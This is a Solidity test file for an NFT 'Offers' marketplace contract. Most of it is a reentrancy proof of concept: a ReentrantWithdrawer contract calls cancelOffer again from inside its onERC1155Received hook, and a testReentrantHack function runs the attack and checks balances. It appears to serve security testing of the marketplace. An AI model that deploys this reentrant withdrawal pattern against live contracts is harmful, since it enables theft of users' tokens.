// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Base.t.sol";
import {Offers} from "../../contracts/Offers.sol";
import {Tokens} from "../../contracts/Tokens.sol";
import {console} from "@narya-ai/contracts/PTest.sol";

import {OffersInterface} from "../../contracts/OffersInterface.sol";
import {TokensInterface} from "../../contracts/TokensInterface.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract OffersTest is TestBase {
    Offers public offers;

    uint256 public listingFee = 1000000;
    uint8 public royaltyNumerator = 51;
    address NFTHolder = makeAddr("NFTHolder");
    address NFTbuyer = makeAddr("NFTbuyer");
    address attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();

        deal(NFTHolder, 10 ether);
        deal(NFTbuyer, 10 ether);
        deal(attacker, 10 ether);

        vm.prank(ceo);
        offers = new Offers(payable(tokens), listingFee, royaltyNumerator);
        vm.stopPrank();

        mintNFT(NFTHolder);
        mintNFT(NFTHolder);
        mintNFT(NFTHolder);
    }

    function testReentrantHack() public {
        console.log(address(tokens));
        ReentrantWithdrawer reentrantAttacker = new ReentrantWithdrawer(
            offers,
            tokens,
            attacker
        );

        // 1. mint NFT, SCI.
        mint(NFTbuyer);
        mint(NFTHolder);
        mint(attacker);
        mintNFT(NFTHolder);
        // 2. setOffer
        uint attackerBid = tokens.balanceOf(attacker);
        console.log(attackerBid);

        vm.startPrank(NFTbuyer);
        tokens.setApprovalForAll(address(offers), true);
        offers.setOffer{value: listingFee}(
            1,
            NFTbuyer,
            uint64(block.timestamp + 10000),
            attackerBid
        );
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 attackerBalanceBefore = tokens.balanceOf(attacker);
        tokens.transfer(address(reentrantAttacker), attackerBid);
        console.log(tokens.balanceOf(address(reentrantAttacker)));

        reentrantAttacker.setApproval(true);

        reentrantAttacker.setOffer{value: listingFee}(
            1,
            uint64(block.timestamp + 10000),
            attackerBid
        );
        // 3. attack
        try reentrantAttacker.cancelOffer() {
            require(
                tokens.balanceOf(address(reentrantAttacker)) ==
                    attackerBalanceBefore,
                "attack was succesful"
            );
        } catch {}
        vm.stopPrank();

        console.log(tokens.balanceOf(address(reentrantAttacker)));
        // require(
        //     tokens.balanceOf(address(reentrantAttacker)) ==
        //         attackerBalanceBefore,
        //     "attack was succesful"
        // );
    }
}

contract ReentrantWithdrawer is ERC1155Holder {
    Offers public offers;
    Tokens public tokens;
    address public owner;
    uint256 price;
    uint64 tokenId;
    bool attack;
    bool entered;

    constructor(Offers _offers, Tokens _tokens, address _owner) {
        console.log(address(_offers));
        console.log(address(_tokens));
        console.log(address(_owner));
        offers = _offers;
        tokens = _tokens;
        owner = _owner;
        attack = false;
    }

    function setOffer(
        uint64 _tokenId,
        uint64 _endTime,
        uint256 _price
    ) public payable {
        tokenId = _tokenId;
        price = _price;
        tokens.setApprovalForAll(address(offers), true);
        offers.setOffer{value: msg.value}(
            _tokenId,
            address(this),
            _endTime,
            _price
        );
    }

    function setApproval(bool approval) public {
        tokens.setApprovalForAll(address(offers), approval);
    }

    function setAttack() public {
        attack = true;
    }

    function cancelOffer() public {
        offers.cancelOffer(address(this), tokenId);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        // Perfom reentrant call
        if (!entered) {
            entered = true;
            cancelOffer();
        }
        return this.onERC1155Received.selector;
    }
}
